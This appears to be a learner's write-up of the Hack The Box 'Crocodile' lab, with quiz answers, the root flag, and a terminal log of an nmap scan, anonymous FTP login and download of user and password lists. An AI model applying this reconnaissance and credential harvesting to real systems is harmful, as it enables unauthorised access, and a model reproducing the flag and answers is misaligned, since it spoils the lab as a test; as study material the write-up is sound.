#### What Nmap scanning switch employs the use of default scripts during a scan?
-sC

#### What service version is found to be running on port 21?
vsftpd 3.0.3

#### What FTP code is returned to us for the "Anonymous FTP login allowed" message?
230

#### After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?
anonymous

#### After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?
get

#### What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?
admin

#### What version of Apache HTTP Server is running on the target host?
Apache httpd 2.4.41

#### What switch can we use with Gobuster to specify we are looking for specific filetypes?
-x

#### Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?
login.php

#### Submit root flag
c7110277ac44d78b6a9fff2232434d16

```
despues de extraer las listas vamos a login.php para ingresar la cuenta de admin.
```

``` bash

┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/crocodile]
└──╼ $sudo nmap -sC -sV 10.129.104.41
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-31 05:24 CST
Nmap scan report for 10.129.104.41
Host is up (0.092s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.204
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.59 seconds
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/crocodile]
└──╼ $ftp 10.129.104.41
Connected to 10.129.104.41.
220 (vsFTPd 3.0.3)
Name (10.129.104.41:ramdark): 
530 This FTP server is anonymous only.
Login failed.
ftp> ^C
ftp> ^Z
[3]+  Stopped                 ftp 10.129.104.41
┌─[✗]─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/crocodile]
└──╼ $
┌─[✗]─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/crocodile]
└──╼ $ftp 10.129.104.41
Connected to 10.129.104.41.
220 (vsFTPd 3.0.3)
Name (10.129.104.41:ramdark): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> user
(username) as
530 Can't change from guest user.
Login failed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (358.0729 kB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
226 Transfer complete.
62 bytes received in 0.00 secs (500.3874 kB/s)
ftp> exit
221 Goodbye.
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/crocodile]
└──╼ $ls
allowed.userlist  allowed.userlist.passwd  Crocodile.md  document.pdf
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/crocodile]
└──╼ $cat allowed.userlist.passwd 
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/crocodile]
└──╼ $cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/crocodile]
└──╼ $





``` 